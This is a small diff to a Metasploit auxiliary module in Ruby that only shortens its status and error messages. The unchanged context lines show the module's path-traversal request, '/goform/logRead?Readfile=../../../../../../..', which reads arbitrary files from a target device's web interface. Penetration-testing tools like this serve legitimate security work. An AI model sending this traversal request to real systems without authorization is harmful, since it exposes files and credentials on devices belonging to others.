@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def read_file(the_cookie)
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Accessing the file...")
+    print_status("Accessing the file...")
     file = datastore['FILENAME']
     fileuri = "/goform/logRead?Readfile=../../../../../../..#{file}"
     final_url = (ssl ? 'https' : 'http').to_s + '://' + "#{rhost}:#{rport}" + fileuri.to_s
@@ -89,7 +89,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good("File saved in: #{p}")
       end
     else
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Could not read file. You can manually check by accessing #{final_url}.")
+      print_error("Could not read file. You can manually check by accessing #{final_url}.")
       return
     end
   end
